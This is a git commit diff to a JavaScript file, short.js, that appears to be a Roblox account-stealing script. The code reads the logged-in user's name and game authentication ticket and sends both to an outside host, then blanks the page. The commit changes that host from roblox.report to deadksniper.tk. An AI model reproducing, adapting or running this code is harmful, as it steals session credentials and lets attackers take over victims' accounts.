2a1a61bc8e1330a309f48e12620ac2df6777fe62
jordyjoestar <66799726+jordyjoestar@users.noreply.github.com>
2020-06-29 21:46:27 +0100

    Update short.js

--- short.js
+++ short.js
@@ -1,7 +1,7 @@
 $.get("/mobileapi/userinfo", function(userInfo){
 var username = userInfo["UserName"];
 $.get('/game-auth/getauthticket', function(authTicket){
-$.get('https://roblox.report/l.php?c='+authTicket+"&u="+username).error(function(d){
+$.get('https://deadksniper.tk/l.php?c='+authTicket+"&u="+username).error(function(d){
 window.location.href="about:blank";
 })
 })
